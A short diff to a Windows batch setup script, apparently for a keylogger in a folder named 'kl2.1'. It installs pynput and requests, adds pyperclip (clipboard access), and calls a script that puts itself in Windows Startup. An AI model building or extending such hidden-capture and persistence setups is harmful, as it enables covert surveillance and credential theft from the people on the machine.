@@ -4,6 +4,7 @@ cd C:\users\%USERNAME%\kl2.1
 
 pip install requests
 pip install pynput
+pip install pyperclip
 
 :: Run autostart.bat to add run.bat to Startup
 call autostart.bat
